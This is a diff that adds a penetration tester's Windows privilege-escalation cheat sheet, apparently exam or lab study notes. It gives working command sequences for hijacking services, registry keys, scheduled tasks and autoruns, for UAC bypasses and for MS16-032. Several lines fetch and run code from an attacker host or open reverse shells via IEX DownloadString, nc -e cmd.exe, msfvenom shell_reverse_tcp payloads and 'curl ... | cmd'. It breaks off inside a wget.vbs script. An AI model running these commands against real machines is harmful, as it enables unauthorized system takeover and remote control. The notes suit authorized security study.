@@ -1,0 +1,810 @@
+Windows Privilege Escalation:
+============================
+Basiscs:
+	Windows Users:
+		Read Windows Internals Sheet
+	Windows Groups:
+		Read Windows Internals Sheet
+	Password Files:
+		Read Windows Internals Sheet
+	Windows Registry:
+		Read Windows Internals Sheet
+ADS:(Alternate Data Stream)
+	Basics:
+		Read Windows Internals Sheet
+	Creating ADS:
+		Using CMD:
+			CMD> echo "abcd" > file1.txt:file2.txt
+		Using PS:
+			PS> set-content -path file1_path -stream stream_name
+	Finding ADS:
+		Using CMD:
+			CMD> dir /r
+				If output is like this "file1.txt:file2.txt" => ADS Exists
+		Using PS:
+			PS> cmd /c 'dir /r'
+	Extracting ADS:
+		Using CMD:
+			CMD> powershell (get-content file.txt -stream stream_name.txt)
+			CMD> notepad file1.txt:file2.txt
+		Using PS:
+			PS> get-item .\file.txt -stream * => show all stream names
+			PS> get-content .\file.txt -stream stream_name.txt => see data of that stream
+	Removing Stream:
+		Using CMD:
+			CMD> powershell (remove-item –path file1_path –stream stream_name)
+		Using PS:
+			PS> remove-item –path file1_path –stream stream_name
+Enumeration:
+	Automated Enumeration:(winpeas.exe -> jaws-enum.ps1/PrivescCheck.ps1/sharup.exe -> watson.exe/sherlock.ps1/wes/wes-ng)
+		MindMap For Automated Scripts:(Read This First)
+			OS enumeration:
+				If cmd:
+					If .NET Absent:
+						powerless.bat
+						winpeas.bat
+					If .NET Present:
+						If >= v4.5:
+							winpeas.exe
+						Else:
+							seatbelt.exe
+				If PS:
+					If run on finish of iex:
+						Jaws-Enum.ps1
+					Else:
+						PrivescCheck.ps1
+						Poweup.ps1 => Important tool for service Exploitation.
+			CVEs:
+				Local:
+					If cmd:
+						If Win 10 >= 1501:
+							Watson.exe
+					If PS:
+						Sherlock.ps1
+				Remote:	
+					WES-NG
+					WES
+		Executables:
+			Important Note:
+				Do not download binaries except winpeas(because they are official). Instead conv sln to exe bcoz it depends on arch and .NET version
+				Guide => https://vk9-sec.com/watson-find-missing-windows-patches-for-local-privilege-escalation/
+				How to convert from .sln to .exe:
+					.NET version:
+						reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+					.exe from .sln:
+						open them in visual studio and right-click -> build
+						go to bin folder, we will find our executable
+			OS Enumeration:
+				winPEAS.exe:(https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries)
+					Its based on seatbelt.exe but it is Regularly updated
+					It can only be used for .NET >= 4.5
+					Usage:
+						winpeas.exe log => this will log the output to out.txt
+						winpeas.exe -linpeas=c:\temp\linpeas.sh => runs linpeas.sh against WSL
+				Seatbelt.sln:(https://github.com/GhostPack/Seatbelt)
+					It can be used for any .NET version
+					Usage:
+						seatbelt.exe -outputfile="C:\temp\out.txt"
+			CVEs:
+				Watson.sln:(https://github.com/rasta-mouse/Watson)
+					Supported Versions:
+						Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004
+						Server 2016 & 2019
+					Usage:
+						>watson.exe
+		Powershell Scripts:(.ps1)
+			Note:
+				To get execution mode:
+					CMD:
+						PowerShell -exec bypass <script_name>
+					PS:
+						1. Set-ExecutionPolicy Bypass -Scope process -Forceexi
+						2. powershell.exe -exec bypass
+			PrivescCheck.ps1:(https://github.com/itm4n/PrivescCheck)
+				updated a month ago
+				updated version of powerup.ps1 
+				Its built over poerup.ps1 and includes accesschk.exe + other things, making it best choice. We can use it for service exploitation too.
+				Usage:
+					Downloading and running in one command:
+						CMD> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://my_ip/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML”
+						PS> Powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://my_ip/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML”
+					Running after downloading:
+						CMD> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
+						PS> . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML
+					Flags:
+						-Extended => more info
+						-Report
+			Jaws-Enum.ps1:(https://github.com/411Hall/JAWS)
+				it runs automatically, once IEX is finished
+				Requirements:
+					Win >= 7
+				Usage:
+					.\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+		Batch Scripts:(.bat)
+			When to use .bat scripts?
+				If we get a legacy system, i.e. no support for powershell and we dont have required .net version to run executables
+			winpeas.bat:(https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat)
+				Usage:
+					> winpeas.bat
+		Windows Exploit Suggesters:
+			Windows expoit suggester:(https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+				./windows-exploit-suggester.py --update
+				./windows-exploit-suggester.py --database <> --systeminfo <>
+				Issue and fix:
+					1. its not working in kali as its written in python2 and needs a package which can only be installed using python-pip (no longer availabel in kali)
+						fix:
+							pip install xlrd==1.2.0
+							pip2 install xlrd==1.2.0
+					2. It was last updated in 2017, so its OUTDATED.
+			wesng:(Windows Exploit Suggester - Next Generation)
+				Installation:	
+					https://github.com/bitsadmin/wesng
+				Usage:	
+					wes.py --update
+					wes.py systeminfo.txt --muc-lookup --exploits-only -i "Elevation of Privilege"
+					wes.py systeminfo.txt --muc-lookup --exploits-only -i "Elevation of Privilege" | grep CVE | uniq | cut -d " " -f 2 => see only list of CVE
+					Issue:
+						poor output as compared to Windows expoit suggester
+	Manual Enumeration:(Using cmd and powershell)
+		Finding Username:(Its an issue in legacy Windows OS as it dont has whoami.exe)
+			whoami
+			echo %username%
+			transfer whoami.exe from kali to windows using smbserver
+			echo %userdomain%
+			echo %USERNAME%
+			set => shows all enviroment vairables
+			SET U => It will return any environment variables that start with U.
+			A bunch of environment variables have the user:
+				TEMP=C:\DOCUME~1\User\LOCALS~1\Temp
+				TMP=C:\DOCUME~1\User\LOCALS~1\Temp
+				USERNAME=user
+				USERPROFILE=C:\Documents and Settings\user
+		systeminfo
+		hostname
+		net user => list all users
+		net localgroup
+		ipconfig /all & route print & arp -a => Network information
+		netstat -ano => List open connections
+	SysInternal Tools:
+		Accesschk.exe:
+			Read ACL section
+		Procmon.exe:(https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
+			Its GUI, so requires RDP access:
+				use filter "path ends with .DLL && result is NAME NOT FOUND"	
+		Autorun.exe:(https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)		
+			Basics:
+				It show autorun files
+			Usage:
+				Its GUI, so requires RDP access:
+					In LOGON tab, we see those files which will run as user who logs_out and logs_in
+	ACL:(Access Control List)
+		Basics:
+			Read "Windows Permissions" Section of Windows Internals Sheet
+		Reading and Modifying ACL:(4 Ways)
+			1. icacls:(Inbuilt CMD tool)
+				icalcs file/folder_name => show permissions
+				Note:
+					To read more about icacls => Read CMD For Pentesting Sheet
+			2. cacls:(Inbuilt CMD tool)
+				calcs file/folder_name => show permissions
+				cacls /t root.txt /e /p user_name:F
+				Note:
+					To read more about cacls => Read CMD For Pentesting Sheet
+			3. accesschk.exe:(https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+				Usage:
+					Folder Permissions
+						accesschk.exe /accepteula -udqv "C:\Program Files" => see permissions for a specified folder for the current user
+						accesschk.exe /accepteula -uwdqsv "Authenticated Users" * => Find folders which are writable by users of "Authenticated Users" group
+					File Permissions
+						accesschk.exe /accepteula -uqv "c:\Program Files\...\file.exe" => see permissions for a specified file for the current user
+						accesschk.exe /accepteula -uwqsv Users "c:\*.*" => find files which are writable by users of "Users" group
+						accesschk.exe /accepteula -uwqsv michael "c:\*.*" => find files which are writable by "michael" user
+					Registry Permissions
+						accesschk.exe /accepteula -uvwqk registry_key_value => see if the sepicifed registery key is writable
+						accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name => see if the sepicifed registery key is writable
+					Service Permissions
+						accesschk.exe /accepteula -ucqv michael svc_name => see permissions for a specified service for "michael" user
+						accesschk.exe /accepteula -uwcqv Everyone * => Find services writable by users of "Everyone" group
+				Note:
+					To read more about accesschk.exe => Read Windows Internals Sheet
+			4. Get-ACL:(inbuilt in powershell)
+				Registry permissions:
+					PS> Get-Acl -Path HKLM:\System\CurrentControlSet\Services\ | fl 
+Getting Initial Shell:
+	A. Upload a payload via Exploitation
+	B. Winrm/RDP
+	C. Using Lateal Movement tools such as psexec
+Privsec Vectors:
+	Basics:
+		Compiling Exploits/Tools:
+			C:
+				Read C For Pentesting Sheet.
+			C++:
+				Read C++ For Pentesting Sheet.
+			C#:
+				Read C# For Pentesting Sheet.
+	Quick Wins:
+		1. Local Services:
+			Are there any services that are listening on 127.0.0.1 only?
+			netstat -ano | findstr "LISTEN"
+		2.	non-default softwares
+		3. Unquoted service paths
+		4. Modifiable service binaries
+		5. Finding Juicy Files:
+	1. %PATH% Hijacking:
+		Basics:
+			PATH is an enviroment variable 
+		Enumeration:
+			echo %PATH% => This will provide paths in descending order of preference.
+			Use cacls/icacls with each path and find out where do we have RW permissions
+		Exploitation:
+			Based on wherw we have RW permissions, we will perform exploitation.
+			Lets assume PATH is c:\abcd;c:\system32
+			So, we will copy malc.exe to c:\abcd\soft.exe
+			As soon as any elevated user will try to run soft.exe, our malc.exe will get executed
+	2. Mining Credentials and Finding Juicy Files: Read AD Exploitation Sheet
+	3. Loopback Services:(Not Related to Service Exploitation)
+		loopbackk(lo) services are those services which run locally
+		netstat -ano | findstr "LISTEN"
+		Port Forwarding: Read Port Forwarding and Pivoting Sheet
+	4. Service Exploitation:(Most Important/Common)
+		A Windows Service is a program that consists of atleast one binary program which runs in background
+		Attack path => replace service binary with a revshell or a malicious command, then restart the service and get system.
+		Enumeration:
+			We need to find a service which is:
+				running as Administrator/SYSTEM
+				writable
+				can be restarted
+			To find Services:
+				Manual:
+					CMD:
+						net start => only list all services
+						Lists service name/status/etc:	
+							wmic service list brief
+							sc query
+					PS:
+						Get-WmiObject Win32_Service
+					Via Registeries:(if neither of the above command works, then we can try to look into registry keys)
+						PS> cd HKLM:\system\currentcontrolset\services
+						PS> ls
+				Automated:
+					Its best that we use powerup.ps1:
+						powerup.ps1 Invoke-AllChecks => this will show all services along with RW permissions and restart privilege
+			Writable Permissions:
+				1. accesschk.exe /accepteula -uwcqv Everyone * => Find services writable by users of "Everyone" group
+				2. icalcs "file/folder_name"
+				3. calcs "file/folder_name"
+				Automating it:(2 steps)
+					for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+					for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+				Note:
+					To read more => ACL section
+			To start/stop a service:
+				CMD:
+					1. wmic service NAMEOFSERVICE call startservice	
+					2. net stop [service name] && net start [service name]
+					3. sc start/stop serviceName
+				Powershell:
+					1. Stop-Service service_name -Force (Start-Service service_name -Force)
+				Note:
+					If the service fails to start because of a dependency:
+						sc config <service> depend= ""
+		Exploitation:(first read Enumeration section before exploitation)
+			1. Unquoted Service Binary Paths:(aka Insecure Service Path)(Service which dont has its executable path enclosed in quotes)
+				Requirements and Enumeration:
+					1. Path to executable:
+						1. Isnt enclosed in quotes(")
+							Manual:
+								wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+							Automated:
+								powerup.ps1
+								Get-ServiceUnquoted
+						2. Contains space between its words.
+							Example => C:\Program File\OpenVPN\bin\openvpnserv.exe
+					2. File Permissions:
+						explained in Enumeration section above
+				Exploitation:
+					Manual:
+						lets say an executable is located at c:\p1\p p\p p p\ex.exe
+							service will start to look for its exe by going from directory to directory like this:
+								c:\something.exe -> c:\p1\something.exe -> c:\p1\p p\something.exe and so on
+						create malc.exe and place it in any of subdirectories of path, where we have write permission
+						sc start service_name
+					PowerUp.ps1:
+						Output of Invoke-AllChecks will give an exploitation path in its output as "AbuseFunction"
+						Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 443"
+			2. Insecure Registry Permissions:(aka Writable Service Registry Keys)
+				Basics:
+					We edit insecure or writable registry keys which belong to some service to point to a malicious executable.
+				Enumeration:
+					Checking permisson for registry services:
+						CMD> accesschk.exe /accepteula "authenticated users" –kvuqsw hklm\System\CurrentControlSet\services
+						CMD> accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services > service_reg_permissions.txt
+							This will show any services which have RW permissions
+					Automated:
+						via scripts
+				Exploitation:
+					create malc.exe using msfvenom and transfer it to c:/temp/x.exe
+					reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d c:\path\shell.exe /f => Point the ImagePath to malicious executable
+						Flags:(for reg add)
+							/v => add into the following key
+							ImagePath => a key of regsvc which stores path of drivers images file. it will store path of our executable file and run it.
+							/t => type
+							REG_EXPAND_SZ => it tells "ImagePath" will store a string in it
+							/d => data
+							c:\temp\x.exe => string stored in "REG_EXPAND_SZ"
+							/f => dont prompt anything, do it quietly.
+						Note:
+							to read more about reg add, read Windows Registry section.
+					CMD> sc start regsvc
+			3. DLL Search Order Hijacking:(aka DLL Load-Order Hijacking)
+				Read DLL Exploitation Section below
+			4. Insecure Service Permissions:(aka BINPATH)(Binary Path)
+				Basics:
+					We use accesschk.exe to find permissions of service and if we are allowed "SERVICE_ALL_ACCESS", then we change binpath(service executable path) to either some command or path to a malicious executable
+				Enumeration:
+					accesschk.exe /accepteula -uwcqv Everyone * => Find services writable by users of "Everyone" group
+				Exploitation:
+					Getting an elevated shell:
+						create malc.exe and transfer it to victim machine
+						sc qc service_name => it will show binary path name
+						sc config <service> binPath= "C:\temp\malc.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+						sc start service_name => it will start service again, resulting in us becoming admin
+					Becoming admin:
+						sc qc service_name => it will show binary path name
+						sc config <service> binPath= "net localgroup administrators user/add" depend= "" start= demand obj= ".\LocalSystem" password= ""
+						sc start service_name => it will start service again, resulting in us becoming admin
+			5. Writable Service Executable:(aka Modifiable service binaries)(aka Insecure File Permissions)
+				A service runs using a binary. If that binary has modifiable permissions, then, we put our malc.exe as service.exe and restart the service
+				Manual Enumeration:(use PrivescCheck.ps1/powerup.ps1 instead)
+					1. First, Find service executables:
+						CMD:(2 ways)
+							A. for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
+							B. sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
+							   FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
+							   FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+						PS:
+					2. Then, Find permission using accesschk.exe/cacls/icacls as explained in Enumeration section
+				Exploitation:
+					create malc.exe using msfvenom and transfer it to folder of executable-to-exploit
+					CMD>sc start service_attached_to_executable
+			Note:
+				Difference between BINPATH and Writable Service Exploitation is that in BINPATH we do not modify its executable, instead we modify a parameter 'binpath' to privesc
+	5. DLL Exploitation: Read DLL Exploitation Sheet
+	6. Insecure Autorun Program Exploitation:
+		Basics:
+			Autorun Programs run when a user logs in. We basically find autorun programs with insecure permissions and change the executable to a malicious executable
+		Enumeration:
+			Step-1: Finding Autorun Programs:
+				A. powersploit/winpeas
+				B. autorun.exe:(https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
+					it show autorun files
+					Its GUI, so requires RDP access
+					In LOGON tab, we see those files which will run as user who logs_out and logs_intab, we see those files which will run as user who logs_out and logs_in
+			Step-2: Find folder permission of autorun program:
+				accesschk.exe /accepteula -udqv "path-to-folder"
+					Note:
+						To read more about accesschk.exe => ACL section	
+		Exploitation:
+			Step-1: Create malc.exe and transfer it to folder of autorun program
+			Step-2: Wait for admin to log-in and log-out
+	7. AlwaysInstallElevated:
+		Basics:
+			AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
+		Enumeration:
+			Is AlwaysInstallElevated enabled?
+				32-bit:
+					CMD> reg query HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER
+					CMD> reg HKCU\SOFTWARE\POLICIES\MICROSOFT\Windows\INSTALLER
+				64-bit:
+					CMD> %SystemRoot%\Sysnative\reg.exe query HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER
+					CMD> %SystemRoot%\Sysnative\reg.exe HKCU\SOFTWARE\POLICIES\MICROSOFT\Windows\INSTALLER				
+				If the value of REG_DWORD of "AlwaysInstallElevated" 0x1, then user of any privilege level is allowed to install .msi files as NT AUTHORITY\SYSTEM.
+		Exploitation:
+			create malc.msi and transfer file to c:\temp
+			CMD> msiexec /quiet /qn /i C:\temp\malicious.msi
+				Flags:
+					/quiet => Suppress any messages to the user during installation
+					/qn => No GUI
+					/i => Regular (vs. administrative) installation				
+	8. Insecure Scheduled Tasks:
+		Basics:
+			We find scheduled tasks which run some executable which has insecure permissions. And then we change the executable to a malicious executable.
+		Enumeration:
+			Finding Scheduled Taks:
+				CMD:
+					schtasks /query /fo LIST /v
+				PS:
+					Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+			Finding Scheduled Tasks with Insecure Folder Permissions:
+				accesschk.exe -dqv "C:\Missing Scheduled Binary\"
+			Exploitation:
+				Create malc.exe and transfer it to location
+				schtasks /create /sc minute /mo 1 /tn "Malware" /tr C:\Temp\SoftwareUpdate\shell.exe =>  launch shell.exe every minute
+				schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM" =>  launch shell.cmd every minute 
+	9. Abusing Privileges:(aka Token Manipultaion)
+		Basics:
+			Terms:
+				Impersonation:
+					It refers to act of pretending as someone else.
+				CLSID:
+					Read Windows Internals Sheet
+				Tokens:(aka Privileges)
+					Read Windows Security Model Section of Windows Internals Sheet
+		Enumeration:
+			Manual:
+				whoami /priv => it will show privileges
+			Automated:
+				MSF:
+					Meterpreter> getprivs
+		Exploitation:
+			A. Token Impersonation: Read AD Exploitation Sheet for this.
+			B. Abusing SEImpersonatePrivilege: Read Potato Exploits Sheet for this
+			C. Abusing Privileges which are NOT DOMAIN related:(specific to Windows Client)
+				SeTrustedCredmanAccessPrivilege:
+					Basics:
+					Exploitation:
+						https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html?m=1
+						https://github.com/Barbarisch/forkatz
+				SeBackUpPrivilege:(used in HTB::BlackField)
+					Basics:	
+						It allows to read any file
+					Exploitation:
+						github.com/giuliano108/SeBackupPrivilege:
+							transfer SeBackupPrivilege/SeBackupPrivilegeCMDLets/bin/Debug/SeBackupPrivilegeCMDLets.DLL to victim
+							transfer SeBackupPrivilege/SeBackupPrivilegeCMDLets/bin/Debug/SeBackupPrivilegeUtils.DLL to victim
+							PS>import-module .\SeBackupPrivilegeCMDLets.DLL
+							PS>import-module .\SeBackupPrivilegeUtils.DLL
+							PS>Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt haha.txt => this will copy contents of root.txt to haha.txt
+				SeRestorePrivilege:
+					Basics:
+						It allows to write to any file.
+					Exploitation:
+				SeTakeOwnershipPrivilege:
+					Basics:
+						It allows to become owner.
+					Exploitation:
+				SeTcbPrivilege:
+					Basics:
+						It allows to become a part of TCB.
+					Exploitation:
+				SeCreateTokenPrivilege:
+					Basics:
+						It allows to create primary token.
+					Exploitation:
+				SeDebugPrivilege:
+					Basics:
+						It allows to access memory of any process.
+					Exploitation:
+	10. Vulnerable installed Softwares:
+		We may find some vulnerable softwares installed on victim which may have some sort of vulnerability based on their version which can help in privesc.
+	11. Startup Application Abuse:
+		Requirements:
+			1. administrator should log-in after reboot!	
+			2. writable permissions for startup folder:(3 Ways)
+				a. accesschk.exe /accepteula -uwdqv "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+					Note:
+						To read more about accesschk.exe => ACL section
+				b. calcs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+				c. icalcs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+		Exploitation:
+			we place malicious.exe in "startup" folder and reboot system and wait for admin to log-in.
+	12. UAC Bypass:
+		Scenario:
+			The shell belongs to the local Administrators group but UAC is enabled and needs to be bypassed, before we can elevate to SYSTEM.
+		Basics:
+			Read Windows Security Model Section of Windows Internals Sheet
+		Enumeration:
+			Requirements:
+				Victim should be a part of "Mandatory Label\High Mandatory Level" group, ie we need to have a moderate integrity shell.
+				To check:
+					whoami /priv
+			Checking UAC settings:
+				reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+					See value of 'EnableLUA' key:
+						0 => UAC is disabled
+						1 => UAC is enabled, then see these values:
+							ConsentPromptBehaviorAdmin:
+								0 => UAC won't prompt (like disabled)
+								1 => the admin is asked for username and password on secure desktop to execute the binary with high rights
+								2 => (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges
+								5 => (default) it will ask the administrator to confirm to run non Windows binaries with high privileges
+							PromptOnSecureDesktop:
+								Values => 0 or 1
+					Summary:
+						If EnableLUA=0 or doesn't exist => no UAC for anyone
+						If EnableLua=1 and LocalAccountTokenFilterPolicy=1 => No UAC for anyone
+						If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0 => No UAC for RID 500 (Built-in Administrator)
+						If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1 => UAC for everyone
+		Exploitation:
+			Automated:
+				Metasploit:
+					exploit/windows/local/bypassuac_eventvwr
+			Manual:
+				UACMe:(https://github.com/hfiref0x/UACME)
+					Basics:
+						Its a compilation of several UAC bypass exploits.
+					Usage:
+						akagi32 [Key] [Param] or akagi64 [Key] [Param
+							key => number of method to use
+								https://github.com/hfiref0x/UACME/blob/master/README.md
+							param:
+								Its optional
+								takes a command, example: executable file name including full path to run.
+								If empty => program will execute elevated CMD.exe
+				Manual Bypassing method-1:(https://github.com/turbo/zero2hero/)
+					Step-1 - Elevate CMD shell from Medium to High integrity:
+						Usage:
+							wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
+							edit main.c:
+								remove comments
+								change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
+						 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
+						 	msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=3333 -f exe -o revshell.exe
+						 	transfer both revshell.exe and eventvwr-bypassuac-64.exe to target\
+						 	c:/>eventvwr-bypassuac-64.exe
+						 	nc -nvlp 3333 => got shell 
+						Explanation:
+							We got a High intergrity shell, means we unlocked more privileges which may or may not be enabled
+							whoami /priv
+					Step-2 - Elevate from High integrity CMD shell to SYSTEM:
+						Usage:
+							msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=4444 -f exe -o revshell2.exe
+							transfer psexec.exe and revshell2.exe to target
+							C:\>PsExec64.exe -i -accepteula -d -s C:\temp\revshell2.exe
+							nc -nvlp 4444 => got shell 
+						Explanation:
+							we got system shell
+					Note:
+						 At ‘Always notify’, in which case ConsentPromptBehaviorAdmin = 2 and PromptOnSecureDesktop = 1, this method will not work
+				Manual Bypassing method-2 using bypassuac.exe:
+					Step-1 - Elevate CMD shell from Medium to High integrity:	
+						In kali, we have:
+							bypassuac-x86.exe
+							bypassuac-x64.exe
+						transfer the exploit according to arch to the target
+						msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=1234 -f exe -o shell.exe
+						C:\>bypassuac-x64.exe /c C:\temp\shell.exe
+						nc -nvlp 1234 => got shell
+					Step-2 - Elevate from High integrity CMD shell to SYSTEM:
+						msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=2222 -f exe -o shell2.exe
+						transfer psexec.exe and shell2.exe on target
+						C:\>PsExec64.exe -i -accepteula -d -s C:\temp\shell.exe
+						nc -nvlp 2222 => got shell as system
+				Manual Bypassing method-3 by exploiting fodhelper.exe:
+					Fodhelper.exe was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It’s location is: C:\Windows\System32\fodhelper.exe and it is signed by Microsoft. The program is allowed to elevate itself to run in a high integrity context automatically. There is no need for any user interaction to allow the process to elevate.
+					https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
+				Bypassing UAC via DLL Hijacking:
+					Here, we find a process/application that has "autoelevate" and then do DLL Hijacking for that process
+				What is "Run as Administrator"
+	13. WSL:(Windows Subsystem for Linux)
+		Basics:
+			2016 onwards
+			allows linux over windows
+			wsl.exe + bash.exe
+		locating them:
+			where \R C:\ bash.exe
+			where \R C:\ wsl.exe
+				\R => recursive
+			wsl.exe whoami
+				mostly we are ROOT in WSL
+			bash.exe => it will give us a linux shell
+				convert it to a TTY shell
+				NOTE: always look at .bash_history
+				>history => same as .bash_history
+		Enumeration:
+			CMD>winpeas.exe -linpeas=c:\temp\linpeas.sh => runs linpeas.sh against WSL
+	14. Windows XP sp1 exploitation:
+		https://guide.offsecnewbie.com/privilege-escalation/windows-pe
+		Do these:
+			sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\CMD.exe"
+			sc config upnphost obj= ".\LocalSystem" password= ""
+			sc qc upnphost
+			sc config SSDPSRV start= auto
+			net start SSDPSRV
+			net start upnphost
+		We will get NT Authority/SYSTEM
+	15. Kernel Exploitation:(Last resort also highly unlikely)
+		Enumeration:
+			Automated:
+				wes-ng
+				watson.exe to find kernel exploits(if any)
+		Exploitation:
+			github.com/secwiki/windows-kernel-exploits/ => windows kernel exploits exe and poc
+			Common Exploits:
+				1. Secondary Logon Handle:(MS16-032)
+					Edit Invoke-MS16-032.ps1:(https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)
+						Append:
+							Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 444"
+					ps> powershell.exe -nop -ep bypass -c  "iex(New-Object Net.Webclient).downloadString('http://10.10.14.14/invoke-ms16032.ps1')"
+File Transfers:
+	A. Both-Way File Transfer:(Upload and Download)
+		1. Using ftp:
+			$ python3 -m pyftpdlib -p 21 --write
+			CMD> ftp my_ip
+				ftp> user:anonymous
+				ftp> password:anonymous
+				ftp> put file.exe
+				Note:
+					windows has inbuilt ftp
+		2. Using TFTP:
+			Basics:
+				Read Active Information Gathering Sheet
+			Requiremennt:
+				1. It should be enabled on windows
+					To check:
+						netstat -na | findstr /R ^UDP.*:69.*LISTENING$ 
+					Sometimes it can be enabled on the command line:
+						CMD>pkgmgr /iu:"TFTP"
+			Starting atftp client on kali:
+				atftpd --daemon --no-fork /tftp/
+			Transferring from Kali to Windows:
+				tftp -i 10.0.0.1 GET file.exe
+			Transferring from Windows to Kali:
+				tftp -i 10.0.0.1 PUT file.exe
+		3. Using SMB: Read SMB Server For Pentesting Sheet
+		4. Using Netcat/Socat/Powercat: Read Exploitation Sheet for this
+	B. Downloading files from windows to kali:
+		crackmapexec smb ip -u 'username' -p 'pass' --get-file \\temp\\creds.txt creds.txt
+	C. Downloading files from kali to windows:
+		Remotely:
+			crackmapexec smb ip -u 'username' -p 'pass' --put-file shell.exe \\temp\\shell.exe
+		Locally:
+			A. CMD:
+				1. certutil -urlcache -split -f http://ip/filename outfile_name
+					-f => file
+				2. bitsadmin /transfer transfName /priority high http://abcd.com/file.pdf C:\downloads\file.pdf
+				3. cURL:
+					Installed by default in Win 10 v1803+
+					Usage:
+						curl http://server/file -o file
+						curl http://server/file.bat | cmd
+				4. wget.vbs:
+					Code:(page 483 of pwk2020 book)
+						echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+						echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+						echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+						echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+						echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+						echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+						echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+						echo Err.Clear >> wget.vbs
+						echo Set http = Nothing >> wget.vbs
+						echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+						echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+						echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+						echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+						echo http.Open "GET",strURL,False >> wget.vbs
+						echo http.Send >> wget.vbs
+						echo varByteArray = http.ResponseBody >> wget.vbs
+						echo Set http = Nothing >> wget.vbs
+						echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+						echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+						echo strData = "" >> wget.vbs
